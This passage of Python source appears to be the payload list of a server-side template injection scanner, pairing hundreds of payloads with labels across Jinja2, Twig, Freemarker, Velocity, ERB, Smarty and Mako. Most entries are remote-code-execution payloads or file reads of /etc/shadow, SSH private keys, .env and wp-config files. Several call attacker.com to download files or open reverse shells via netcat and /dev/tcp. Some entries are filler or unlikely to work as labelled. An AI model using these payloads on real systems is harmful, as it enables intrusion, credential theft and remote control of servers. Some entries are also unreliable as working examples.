        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__.os.popen('id').read()}}", 'Jinja2 FileReader OS'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", 'Jinja2 Complex Import'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.get('__builtins__').get('__import__')('os').popen('id').read()}}", 'Jinja2 Get Method'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.get('__builtins__').get('eval')('__import__(\"os\").popen(\"id\").read()')}}", 'Jinja2 Eval RCE'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['exec']('import os; print(os.popen(\"id\").read())')}}", 'Jinja2 Exec RCE'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['compile']('import os; os.system(\"id\")','','exec')}}", 'Jinja2 Compile RCE'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['__import__']('subprocess').Popen('id',shell=True).stdout.read()}}", 'Jinja2 Subprocess RCE'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/proc/self/environ').read()}}", 'Jinja2 Environ Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/proc/self/cmdline').read()}}", 'Jinja2 Cmdline Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/proc/self/status').read()}}", 'Jinja2 Status Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/log/apache2/access.log').read()}}", 'Jinja2 Apache Log'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/log/nginx/access.log').read()}}", 'Jinja2 Nginx Log'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/log/auth.log').read()}}", 'Jinja2 Auth Log'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/shadow').read()}}", 'Jinja2 Shadow Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/hostname').read()}}", 'Jinja2 Hostname Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/hosts').read()}}", 'Jinja2 Hosts Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/resolv.conf').read()}}", 'Jinja2 Resolv Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/fstab').read()}}", 'Jinja2 FSTAB Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/mtab').read()}}", 'Jinja2 MTAB Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/crontab').read()}}", 'Jinja2 Crontab Read'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/ssh/sshd_config').read()}}", 'Jinja2 SSH Config'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/root/.bashrc').read()}}", 'Jinja2 Root Bashrc'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/home/www-data/.bash_history').read()}}", 'Jinja2 Bash History'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/www/html/.env').read()}}", 'Jinja2 Env File'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/www/html/wp-config.php').read()}}", 'Jinja2 WP Config'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/www/html/.htaccess').read()}}", 'Jinja2 HTAccess'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/www/html/.git/config').read()}}", 'Jinja2 Git Config'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/var/lib/mysql/mysql/user.MYD').read()}}", 'Jinja2 MySQL User'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/root/.ssh/id_rsa').read()}}", 'Jinja2 SSH Key'),
        
        # ==================== 301-350: TWIG / SYMFONY ====================
        ('{{7*7}}', 'Twig Math 49'),
        ('{{7+7}}', 'Twig Addition 14'),
        ('{{7-7}}', 'Twig Subtraction 0'),
        ('{{7/7}}', 'Twig Division 1'),
        ('{{7%7}}', 'Twig Modulo 0'),
        ('{{7**7}}', 'Twig Power 823543'),
        ('{{_self}}', 'Twig Self Object'),
        ('{{_self.env}}', 'Twig Environment'),
        ('{{_self.env.getDebug()}}', 'Twig Debug'),
        ('{{_self.env.getCharset()}}', 'Twig Charset'),
        ('{{_self.env.getCache()}}', 'Twig Cache'),
        ('{{_self.env.getTemplateClass()}}', 'Twig Template Class'),
        ('{{_self.env.getLoader()}}', 'Twig Loader'),
        ('{{_self.env.getExtensions()}}', 'Twig Extensions'),
        ('{{_self.env.getFilters()}}', 'Twig Filters'),
        ('{{_self.env.getFunctions()}}', 'Twig Functions'),
        ('{{_self.env.getTests()}}', 'Twig Tests'),
        ('{{_self.env.getGlobals()}}', 'Twig Globals'),
        ('{{_self.env.registerUndefinedFilterCallback("exec")}}', 'Twig Register Filter'),
        ('{{_self.env.getFilter("exec")}}', 'Twig Get Filter'),
        ('{{["id"]|filter("system")}}', 'Twig Filter System'),
        ('{{["cat /etc/passwd"]|filter("exec")}}', 'Twig Filter Exec'),
        ('{{["id"]|map("system")}}', 'Twig Map System'),
        ('{{["id"]|reduce("system")}}', 'Twig Reduce System'),
        ('{{["id"]|sort("system")}}', 'Twig Sort System'),
        ('{{["id"]|batch(1,"system")}}', 'Twig Batch System'),
        ('{{["id"]|slice(0,1,"system")}}', 'Twig Slice System'),
        ('{{["id"]|default("system")}}', 'Twig Default System'),
        ('{{["id"]|join("system")}}', 'Twig Join System'),
        ('{{["id"]|replace("system")}}', 'Twig Replace System'),
        ('{{["id"]|split("system")}}', 'Twig Split System'),
        ('{{["id"]|merge("system")}}', 'Twig Merge System'),
        ('{{["id"]|filter("passthru")}}', 'Twig Passthru'),
        ('{{["id"]|filter("exec")}}', 'Twig Exec'),
        ('{{["id"]|filter("shell_exec")}}', 'Twig ShellExec'),
        ('{{_self.env.setCache("ftp://attacker.com")}}', 'Twig Cache Attack'),
        ('{{_self.env.loadTemplate("evil")}}', 'Twig Load Template'),
        ('{{include("evil")}}', 'Twig Include'),
        ('{{source("evil")}}', 'Twig Source'),
        ('{{constant("EVIL")}}', 'Twig Constant'),
        ('{{parent()}}', 'Twig Parent'),
        ('{{block("evil")}}', 'Twig Block'),
        ('{{attribute(_self.env, "getFilter")}}', 'Twig Attribute'),
        ('{{_self.env.getFilter("eval")}}', 'Twig Eval Filter'),
        ('{{_self.env.getFunction("eval")}}', 'Twig Eval Function'),
        ('{{_self.env.getTest("eval")}}', 'Twig Eval Test'),
        ('{{["id"]|filter("eval")}}', 'Twig Eval Filter RCE'),
        
        # ==================== 351-400: FREEMARKER ====================
        ('${7*7}', 'Freemarker Math 49'),
        ('${7+7}', 'Freemarker Addition 14'),
        ('${7-7}', 'Freemarker Subtraction 0'),
        ('${7/7}', 'Freemarker Division 1'),
        ('${7%7}', 'Freemarker Modulo 0'),
        ('${7?int?c}', 'Freemarker Number Format'),
        ('${.now}', 'Freemarker Current Time'),
        ('${.vars}', 'Freemarker Variables'),
        ('${.data_model}', 'Freemarker Data Model'),
        ('${.main}', 'Freemarker Main'),
        ('${.version}', 'Freemarker Version'),
        ('${.lang}', 'Freemarker Lang'),
        ('${.template_name}', 'Freemarker Template Name'),
        ('${.template_language}', 'Freemarker Template Lang'),
        ('${product("id")}', 'Freemarker Product Method'),
        ('${product("whoami")}', 'Freemarker Product Whoami'),
        ('${product("cat /etc/passwd")}', 'Freemarker Product Cat'),
        ('${${"freemarker.template.utility.Execute"?new()("id")}}', 'Freemarker Execute RCE'),
        ('${${"freemarker.template.utility.Execute"?new()("whoami")}}', 'Freemarker Execute Whoami'),
        ('${${"freemarker.template.utility.Execute"?new()("ls -la")}}', 'Freemarker Execute LS'),
        ('${${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}}', 'Freemarker Execute Cat'),
        ('${${"freemarker.template.utility.Execute"?new()("curl http://attacker.com")}}', 'Freemarker Execute Curl'),
        ('${${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}}', 'Freemarker ProcessBuilder'),
        ('${${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}}', 'Freemarker ProcessBuilder Whoami'),
        ('${${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","cat /etc/passwd").start()}}', 'Freemarker ProcessBuilder Cat'),
        ('${${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").getRuntime().exec("id")}}', 'Freemarker Runtime RCE'),
        ('${${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").getRuntime().exec("whoami")}}', 'Freemarker Runtime Whoami'),
        ('${${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.Runtime").getRuntime().exec("cat /etc/passwd")}}', 'Freemarker Runtime Cat'),
        ('${${"freemarker.template.utility.JythonRuntime"?new()("import os; os.system(\'id\')")}}', 'Freemarker Jython RCE'),
        ('${${"freemarker.template.utility.JythonRuntime"?new()("import os; os.system(\'whoami\')")}}', 'Freemarker Jython Whoami'),
        ('${.lang["freemarker.template.utility.Execute"]?new()("id")}', 'Freemarker Lang Execute'),
        ('${.lang["freemarker.template.utility.ObjectConstructor"]?new()("java.lang.ProcessBuilder","id").start()}', 'Freemarker Lang ProcessBuilder'),
        ('${.lang["freemarker.template.utility.JythonRuntime"]?new()("import os; os.system(\'id\')")}', 'Freemarker Lang Jython'),
        ('${"freemarker.template.utility.Execute"?new()("id")}', 'Freemarker String Execute'),
        ('${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}', 'Freemarker String ProcessBuilder'),
        ('${"freemarker.template.utility.JythonRuntime"?new()("import os; os.system(\'id\')")}', 'Freemarker String Jython'),
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'Freemarker Assign Execute'),
        ('<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}', 'Freemarker Assign ProcessBuilder'),
        ('<#assign jy="freemarker.template.utility.JythonRuntime"?new()>${jy("import os; os.system(\'id\')")}', 'Freemarker Assign Jython'),
        ('${.main?eval("id")}', 'Freemarker Eval'),
        ('${.main?interpret("id")}', 'Freemarker Interpret'),
        ('<#assign x="${7*7}">${x}', 'Freemarker Variable Assign'),
        ('<#assign x="id">${x?exec}', 'Freemarker Exec'),
        
        # ==================== 401-450: VELOCITY ====================
        ('${7*7}', 'Velocity Math 49'),
        ('${7+7}', 'Velocity Addition 14'),
        ('${7-7}', 'Velocity Subtraction 0'),
        ('${7/7}', 'Velocity Division 1'),
        ('${7%7}', 'Velocity Modulo 0'),
        ('$!{7*7}', 'Velocity Silent Math'),
        ('$!{7+7}', 'Velocity Silent Addition'),
        ('${7*7}.', 'Velocity Math Period'),
        ('$myVar', 'Velocity Variable'),
        ('${myVar}', 'Velocity Braced Variable'),
        ('$!{myVar}', 'Velocity Silent Variable'),
        ('#set($x=7*7)', 'Velocity Set Math'),
        ('#set($x=7+7)', 'Velocity Set Addition'),
        ('#set($x=7-7)', 'Velocity Set Subtraction'),
        ('#set($x=7/7)', 'Velocity Set Division'),
        ('#set($x=7%7)', 'Velocity Set Modulo'),
        ('#set($x="id")', 'Velocity Set String'),
        ('#set($x="whoami")', 'Velocity Set Whoami'),
        ('#set($x="cat /etc/passwd")', 'Velocity Set Cat'),
        ('#set($x=$class.inspect("java.lang.Runtime").type.getRuntime())', 'Velocity Runtime Setup'),
        ('#set($x=$class.inspect("java.lang.Runtime").getRuntime())', 'Velocity Runtime Alt'),
        ('#set($x=$class.forName("java.lang.Runtime"))', 'Velocity Class ForName'),
        ('#set($x=$x.getRuntime())', 'Velocity Get Runtime'),
        ('#set($proc=$x.exec("id"))', 'Velocity Exec RCE'),
        ('#set($proc=$x.exec("whoami"))', 'Velocity Exec Whoami'),
        ('#set($proc=$x.exec("cat /etc/passwd"))', 'Velocity Exec Cat'),
        ('#set($proc=$x.exec("curl http://attacker.com"))', 'Velocity Exec Curl'),
        ('#set($proc=$x.exec("wget http://attacker.com/shell.php"))', 'Velocity Exec Wget'),
        ('#set($proc=$x.exec("nc -e /bin/sh attacker.com 4444"))', 'Velocity Exec Netcat'),
        ('#set($null=$proc.waitFor())', 'Velocity Wait For'),
        ('${proc.exitValue}', 'Velocity Exit Value'),
        ('#set($process=$class.forName("java.lang.ProcessBuilder").getConstructor(java.util.List).newInstance(["id"]))', 'Velocity ProcessBuilder List'),
        ('#set($process=$class.forName("java.lang.ProcessBuilder").getConstructor(java.lang.String[]).newInstance(["id"]))', 'Velocity ProcessBuilder Array'),
        ('#set($process=$process.start())', 'Velocity Process Start'),
        ('#set($input=$process.getInputStream())', 'Velocity Get Input'),
        ('#set($scanner=$class.forName("java.util.Scanner").getConstructor(java.io.InputStream).newInstance($input))', 'Velocity Scanner'),
        ('#set($scanner=$scanner.useDelimiter("\\A"))', 'Velocity Scanner Delimiter'),
        ('${scanner.hasNext()?$scanner.next():""}', 'Velocity Scanner Output'),
        ('$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")', 'Velocity One Liner'),
        ('$class.forName("java.lang.Runtime").getRuntime().exec("id")', 'Velocity ForName One Liner'),
        ('${$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")}', 'Velocity Braced One Liner'),
        ('${$class.forName("java.lang.Runtime").getRuntime().exec("id")}', 'Velocity Braced ForName'),
        ('#set($str=$class.forName("java.lang.String"))', 'Velocity String Class'),
        ('#set($obj=$class.forName("java.lang.Object"))', 'Velocity Object Class'),
        ('#set($sys=$class.forName("java.lang.System"))', 'Velocity System Class'),
        ('${sys.getProperty("os.name")}', 'Velocity OS Name'),
        ('${sys.getProperty("user.dir")}', 'Velocity User Dir'),
        ('${sys.getenv("PATH")}', 'Velocity Path Env'),
        ('${sys.getenv("HOME")}', 'Velocity Home Env'),
        
        # ==================== 451-500: ERB / RUBY ====================
        ('<%= 7*7 %>', 'ERB Math 49'),
        ('<%= 7+7 %>', 'ERB Addition 14'),
        ('<%= 7-7 %>', 'ERB Subtraction 0'),
        ('<%= 7/7 %>', 'ERB Division 1'),
        ('<%= 7%7 %>', 'ERB Modulo 0'),
        ('<%= 7**7 %>', 'ERB Power 823543'),
        ('<%= "7"*7 %>', 'ERB String Repeat'),
        ('<%= "7"+"7" %>', 'ERB String Concat'),
        ('<%= system("id") %>', 'ERB System RCE'),
        ('<%= system("whoami") %>', 'ERB System Whoami'),
        ('<%= system("ls -la") %>', 'ERB System LS'),
        ('<%= system("cat /etc/passwd") %>', 'ERB System Cat'),
        ('<%= `id` %>', 'ERB Backticks RCE'),
        ('<%= `whoami` %>', 'ERB Backticks Whoami'),
        ('<%= `cat /etc/passwd` %>', 'ERB Backticks Cat'),
        ('<%= %x{id} %>', 'ERB Percent X RCE'),
        ('<%= %x{whoami} %>', 'ERB Percent X Whoami'),
        ('<%= %x{cat /etc/passwd} %>', 'ERB Percent X Cat'),
        ('<%= IO.popen("id").readlines() %>', 'ERB IO Popen RCE'),
        ('<%= IO.popen("whoami").readlines() %>', 'ERB IO Popen Whoami'),
        ('<%= IO.popen("cat /etc/passwd").readlines() %>', 'ERB IO Popen Cat'),
        ('<%= IO.popen("id").read() %>', 'ERB IO Popen Read'),
        ('<%= IO.popen("whoami").read() %>', 'ERB IO Popen Read Whoami'),
        ('<%= IO.popen("cat /etc/passwd").read() %>', 'ERB IO Popen Read Cat'),
        ('<%= File.read("/etc/passwd") %>', 'ERB File Read'),
        ('<%= File.read("/etc/hostname") %>', 'ERB File Read Hostname'),
        ('<%= File.read("/etc/hosts") %>', 'ERB File Read Hosts'),
        ('<%= File.read("/var/www/html/.env") %>', 'ERB File Read Env'),
        ('<%= File.read("/var/www/html/wp-config.php") %>', 'ERB File Read WP'),
        ('<%= File.open("/etc/passwd").read() %>', 'ERB File Open Read'),
        ('<%= File.readlines("/etc/passwd") %>', 'ERB File Readlines'),
        ('<%= File.binread("/etc/passwd") %>', 'ERB Binread'),
        ('<%= open("/etc/passwd").read() %>', 'ERB Open Read'),
        ('<%= IO.read("/etc/passwd") %>', 'ERB IO Read'),
        ('<%= IO.binread("/etc/passwd") %>', 'ERB IO Binread'),
        ('<%= Kernel.open("/etc/passwd").read() %>', 'ERB Kernel Open'),
        ('<%= open("|id").read() %>', 'ERB Pipe Open RCE'),
        ('<%= open("|whoami").read() %>', 'ERB Pipe Open Whoami'),
        ('<%= open("|cat /etc/passwd").read() %>', 'ERB Pipe Open Cat'),
        ('<%= IO.popen("-","id") %>', 'ERB Popen Dash'),
        ('<%= IO.popen(["-","id"]) %>', 'ERB Popen Array'),
        ('<%= ENV["PATH"] %>', 'ERB ENV Path'),
        ('<%= ENV["HOME"] %>', 'ERB ENV Home'),
        ('<%= ENV["USER"] %>', 'ERB ENV User'),
        ('<%= ENV["PWD"] %>', 'ERB ENV PWD'),
        ('<%= ENV.inspect %>', 'ERB ENV Inspect'),
        ('<%= `ls -la` %>', 'ERB LS Detail'),
        ('<%= `pwd` %>', 'ERB PWD'),
        ('<%= `whoami` %>', 'ERB Whoami Detail'),
        ('<%= `hostname` %>', 'ERB Hostname'),
        ('<%= `uname -a` %>', 'ERB Uname'),
        
        # ==================== 501-550: SMARTY / PHP ====================
        ('{7*7}', 'Smarty Math 49'),
        ('{7+7}', 'Smarty Addition 14'),
        ('{7-7}', 'Smarty Subtraction 0'),
        ('{7/7}', 'Smarty Division 1'),
        ('{7%7}', 'Smarty Modulo 0'),
        ('{7|7}', 'Smarty Bit OR'),
        ('{7&7}', 'Smarty Bit AND'),
        ('{7^7}', 'Smarty Bit XOR'),
        ('{$smarty.version}', 'Smarty Version'),
        ('{$smarty.now}', 'Smarty Current Time'),
        ('{$smarty.template}', 'Smarty Template'),
        ('{$smarty.template_object}', 'Smarty Template Object'),
        ('{$smarty.section}', 'Smarty Section'),
        ('{$smarty.foreach}', 'Smarty Foreach'),
        ('{$smarty.capture}', 'Smarty Capture'),
        ('{$smarty.config}', 'Smarty Config'),
        ('{$smarty.const}', 'Smarty Constants'),
        ('{$smarty.get}', 'Smarty GET'),
        ('{$smarty.post}', 'Smarty POST'),
        ('{$smarty.cookie}', 'Smarty Cookie'),
        ('{$smarty.session}', 'Smarty Session'),
        ('{$smarty.request}', 'Smarty Request'),
        ('{$smarty.server}', 'Smarty Server'),
        ('{php}echo 7*7;{/php}', 'Smarty PHP Math'),
        ('{php}echo 7+7;{/php}', 'Smarty PHP Addition'),
        ('{php}system("id");{/php}', 'Smarty PHP System RCE'),
        ('{php}system("whoami");{/php}', 'Smarty PHP Whoami'),
        ('{php}system("cat /etc/passwd");{/php}', 'Smarty PHP Cat'),
        ('{php}passthru("id");{/php}', 'Smarty PHP Passthru'),
        ('{php}exec("id",$out);print_r($out);{/php}', 'Smarty PHP Exec'),
        ('{php}shell_exec("id");{/php}', 'Smarty PHP ShellExec'),
        ('{php}echo `id`;{/php}', 'Smarty PHP Backticks'),
        ('{php}readfile("/etc/passwd");{/php}', 'Smarty PHP Readfile'),
        ('{php}file_get_contents("/etc/passwd");{/php}', 'Smarty PHP FileGet'),
        ('{php}fopen("/etc/passwd","r");{/php}', 'Smarty PHP Fopen'),
        ('{system("id")}', 'Smarty System Function'),
        ('{system("whoami")}', 'Smarty System Whoami'),
        ('{system("cat /etc/passwd")}', 'Smarty System Cat'),
        ('{passthru("id")}', 'Smarty Passthru Function'),
        ('{exec("id")}', 'Smarty Exec Function'),
        ('{shell_exec("id")}', 'Smarty ShellExec Function'),
        ('{readfile("/etc/passwd")}', 'Smarty Readfile Function'),
        ('{file_get_contents("/etc/passwd")}', 'Smarty FileGet Function'),
        ('{include_php "file.php"}', 'Smarty Include PHP'),
        ('{include file="evil.tpl"}', 'Smarty Include Template'),
        ('{eval var="id"}', 'Smarty Eval'),
        ('{eval var="system(\'id\')"}', 'Smarty Eval RCE'),
        ('{literal}{/literal}', 'Smarty Literal'),
        ('{strip}{/strip}', 'Smarty Strip'),
        ('{cycle values="1,2,3"}', 'Smarty Cycle'),
        
        # ==================== 551-600: MAKO / PYTHON ====================
        ('${7*7}', 'Mako Math 49'),
        ('${7+7}', 'Mako Addition 14'),
        ('${7-7}', 'Mako Subtraction 0'),
        ('${7/7}', 'Mako Division 1'),
        ('${7%7}', 'Mako Modulo 0'),
        ('${7**7}', 'Mako Power 823543'),
        ('${"7"*7}', 'Mako String Repeat'),
        ('${"7"+"7"}', 'Mako String Concat'),
        ('${__import__("os").popen("id").read()}', 'Mako Import RCE'),
        ('${__import__("os").popen("whoami").read()}', 'Mako Import Whoami'),
        ('${__import__("os").popen("ls -la").read()}', 'Mako Import LS'),
        ('${__import__("os").popen("cat /etc/passwd").read()}', 'Mako Import Cat'),
        ('${__import__("os").system("id")}', 'Mako System RCE'),
        ('${__import__("os").system("whoami")}', 'Mako System Whoami'),
        ('${__import__("os").system("cat /etc/passwd")}', 'Mako System Cat'),
        ('${open("/etc/passwd").read()}', 'Mako File Read'),
        ('${open("/etc/hostname").read()}', 'Mako Hostname Read'),
        ('${open("/etc/hosts").read()}', 'Mako Hosts Read'),
        ('${open("/var/www/html/.env").read()}', 'Mako Env Read'),
        ('${open("/var/www/html/wp-config.php").read()}', 'Mako WP Read'),
        ('${open("C:\\windows\\win.ini").read()}', 'Mako Windows Read'),
        ('${__import__("subprocess").Popen("id",shell=True).stdout.read()}', 'Mako Subprocess RCE'),
        ('${__import__("subprocess").Popen("whoami",shell=True).stdout.read()}', 'Mako Subprocess Whoami'),
        ('${__import__("subprocess").Popen("cat /etc/passwd",shell=True).stdout.read()}', 'Mako Subprocess Cat'),
        ('${__import__("subprocess").check_output("id",shell=True)}', 'Mako Check Output'),
        ('${__import__("subprocess").check_output(["id"],shell=True)}', 'Mako Check Output List'),
        ('${__import__("subprocess").run("id",shell=True)}', 'Mako Run'),
        ('${__import__("subprocess").call("id",shell=True)}', 'Mako Call'),
        ('${__import__("os").popen("curl http://attacker.com").read()}', 'Mako Curl'),
        ('${__import__("os").popen("wget http://attacker.com/shell.php").read()}', 'Mako Wget'),
        ('${__import__("os").popen("nc -e /bin/sh attacker.com 4444").read()}', 'Mako Netcat'),
        ('${__import__("os").popen("bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"").read()}', 'Mako Reverse Shell'),
        ('${__import__("socket").socket.socket().connect(("attacker.com",4444))}', 'Mako Socket'),
        ('${__import__("urllib").urlopen("http://attacker.com").read()}', 'Mako Urllib'),
        ('${__import__("requests").get("http://attacker.com").text}', 'Mako Requests'),
        ('${__import__("sys").version}', 'Mako Python Version'),
        ('${__import__("sys").path}', 'Mako Python Path'),
        ('${__import__("sys").modules}', 'Mako Modules'),
        ('${__import__("platform").platform()}', 'Mako Platform'),
        ('${__import__("platform").uname()}', 'Mako Uname'),
        ('${__import__("time").time()}', 'Mako Time'),
        ('${__import__("datetime").datetime.now()}', 'Mako DateTime'),
        ('${__import__("json").dumps({"test":"value"})}', 'Mako JSON'),
        ('${__import__("base64").b64encode(b"test")}', 'Mako Base64'),
        ('${__import__("hashlib").md5(b"test").hexdigest()}', 'Mako MD5'),
        ('${__import__("random").randint(1,100)}', 'Mako Random'),
        ('${__import__("string").ascii_lowercase}', 'Mako String Module'),
        ('${__import__("os").getenv("PATH")}', 'Mako GetEnv'),
        ('${__import__("os").getcwd()}', 'Mako GetCWD'),
        ('${__import__("os").listdir("/")}', 'Mako ListDir'),
        
        # ==================== 601-650: JINJA2 - BYPASSES & ALTERNATIVES ====================
        ('{{7*7}}', 'Jinja2 Math Basic'),
        ('{{7+7}}', 'Jinja2 Add Basic'),
        ('{{7*7}}', 'Jinja2 Multiply'),
        ('{{"7"*7}}', 'Jinja2 String Multiply'),
        ('{{7|string}}', 'Jinja2 String Filter'),
        ('{{7|int}}', 'Jinja2 Int Filter'),
        ('{{7|float}}', 'Jinja2 Float Filter'),
        ('{{7|abs}}', 'Jinja2 Abs Filter'),
        ('{{7|round}}', 'Jinja2 Round Filter'),
        ('{{7|trim}}', 'Jinja2 Trim Filter'),
        ('{{7|length}}', 'Jinja2 Length Filter'),
        ('{{7|reverse}}', 'Jinja2 Reverse Filter'),
        ('{{7|sort}}', 'Jinja2 Sort Filter'),
        ('{{7|batch(2)}}', 'Jinja2 Batch Filter'),
        ('{{7|slice(2)}}', 'Jinja2 Slice Filter'),
        ('{{7|groupby}}', 'Jinja2 GroupBy Filter'),
        ('{{7|select}}', 'Jinja2 Select Filter'),
        ('{{7|reject}}', 'Jinja2 Reject Filter'),
        ('{{7|map}}', 'Jinja2 Map Filter'),
        ('{{7|join}}', 'Jinja2 Join Filter'),
        ('{{7|replace("7","49")}}', 'Jinja2 Replace Filter'),
        ('{{7|default(0)}}', 'Jinja2 Default Filter'),
        ('{{7|safe}}', 'Jinja2 Safe Filter'),
        ('{{7|escape}}', 'Jinja2 Escape Filter'),
        ('{{7|e}}', 'Jinja2 E Filter'),
        ('{{7|forceescape}}', 'Jinja2 ForceEscape Filter'),
        ('{{7|urlencode}}', 'Jinja2 URLEncode Filter'),
        ('{{7|urlize}}', 'Jinja2 URLize Filter'),
        ('{{7|capitalize}}', 'Jinja2 Capitalize Filter'),
        ('{{7|lower}}', 'Jinja2 Lower Filter'),
        ('{{7|upper}}', 'Jinja2 Upper Filter'),
        ('{{7|title}}', 'Jinja2 Title Filter'),
        ('{{7|truncate(3)}}', 'Jinja2 Truncate Filter'),
        ('{{7|wordcount}}', 'Jinja2 WordCount Filter'),
        ('{{7|striptags}}', 'Jinja2 StripTags Filter'),
        ('{{7|xmlattr}}', 'Jinja2 XMLAttr Filter'),
        ('{{7|filesizeformat}}', 'Jinja2 FileSize Filter'),
        ('{{7|pprint}}', 'Jinja2 PrettyPrint Filter'),
        ('{{7|indent(2)}}', 'Jinja2 Indent Filter'),
        ('{{request.args.get("x")}}', 'Jinja2 Request Args Get'),
        ('{{request.form.get("x")}}', 'Jinja2 Request Form Get'),
        ('{{request.cookies.get("x")}}', 'Jinja2 Request Cookie Get'),
        ('{{request.headers.get("x")}}', 'Jinja2 Request Header Get'),
        ('{{request.environ.get("HTTP_USER_AGENT")}}', 'Jinja2 Request UserAgent'),
        ('{{request.environ.get("REMOTE_ADDR")}}', 'Jinja2 Request IP'),
        ('{{request.environ.get("REQUEST_METHOD")}}', 'Jinja2 Request Method'),
        ('{{request.environ.get("QUERY_STRING")}}', 'Jinja2 Query String'),
        ('{{request.environ.get("SERVER_SOFTWARE")}}', 'Jinja2 Server Software'),
        ('{{request.environ.get("HTTP_HOST")}}', 'Jinja2 Host'),
        ('{{request.environ.get("HTTP_REFERER")}}', 'Jinja2 Referer'),
        
        # ==================== 651-700: JINJA2 - ALTERNATIVE CLASS SUBSCRIPTS ====================
        ("{{''|class}}", 'Jinja2 Empty String Class Filter'),
        ("{{''|class|mro}}", 'Jinja2 MRO Filter'),
        ("{{''|class|mro|first}}", 'Jinja2 MRO First'),
        ("{{''|class|mro|last}}", 'Jinja2 MRO Last'),
        ("{{''|class|mro|length}}", 'Jinja2 MRO Length'),
        ("{{''|class|mro|list}}", 'Jinja2 MRO List'),
        ("{{''|class|mro|join}}", 'Jinja2 MRO Join'),
        ("{{''|class|mro|select|list}}", 'Jinja2 MRO Select'),
        ("{{''|class|mro|reject|list}}", 'Jinja2 MRO Reject'),
        ("{{''|class|mro|map|list}}", 'Jinja2 MRO Map'),
        ("{{''|class|mro|batch(2)|list}}", 'Jinja2 MRO Batch'),
        ("{{''|class|mro|slice(2)|list}}", 'Jinja2 MRO Slice'),
        ("{{''|class|mro|sort|list}}", 'Jinja2 MRO Sort'),
        ("{{''|class|mro|reverse|list}}", 'Jinja2 MRO Reverse'),
        ("{{''|class|mro|attr('__subclasses__')}}", 'Jinja2 Subclasses via Attr'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')}}", 'Jinja2 Subclasses via Index'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|first}}", 'Jinja2 First Subclass'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|last}}", 'Jinja2 Last Subclass'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|length}}", 'Jinja2 Subclass Count'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|list}}", 'Jinja2 Subclass List'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|select|list}}", 'Jinja2 Subclass Select'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|reject|list}}", 'Jinja2 Subclass Reject'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|map|list}}", 'Jinja2 Subclass Map'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|batch(10)|list}}", 'Jinja2 Subclass Batch'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|slice(10)|list}}", 'Jinja2 Subclass Slice'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|sort|list}}", 'Jinja2 Subclass Sort'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|reverse|list}}", 'Jinja2 Subclass Reverse'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(40)}}", 'Jinja2 Subclass Index 40'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(50)}}", 'Jinja2 Subclass Index 50'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(60)}}", 'Jinja2 Subclass Index 60'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(70)}}", 'Jinja2 Subclass Index 70'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(80)}}", 'Jinja2 Subclass Index 80'),
        ("{{''|class|mro|attr(1)|attr('__subclasses__')|attr(90)}}", 'Jinja2 Subclass Index 90'),
